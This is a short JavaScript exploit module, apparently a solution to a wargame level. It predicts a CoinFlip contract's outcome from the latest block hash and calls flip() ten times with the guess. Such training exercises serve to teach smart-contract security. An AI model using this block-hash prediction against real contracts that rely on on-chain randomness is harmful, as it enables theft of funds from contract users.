const level3 = async (web3, CoinFlip) => {

    const targetAddress = '0x785ff1dadf5035488b7d93c91289d20293027e21';
    const target = await CoinFlip.at(targetAddress);

    console.log(`Exploiting Level3 target ${targetAddress}...`);

    for (let i = 0; i < 10; i++) {
        console.log(`Coin flip ${i}...`);

        console.log('Retrieving latest block number...');
        const n = await web3.eth.getBlockNumber();
        console.log('Retrieving latest block...');
        const block = await web3.eth.getBlock(n);
        const hash = block.hash;
        // use only the first hex character to avoid exceeded MAX_SAFE_INTEGER
        const prediction = Number(hash.slice(0, 3)) >> 3 === 1;
        console.log('Performing flip...');
        await target.flip(prediction);
    }
};

module.exports = level3;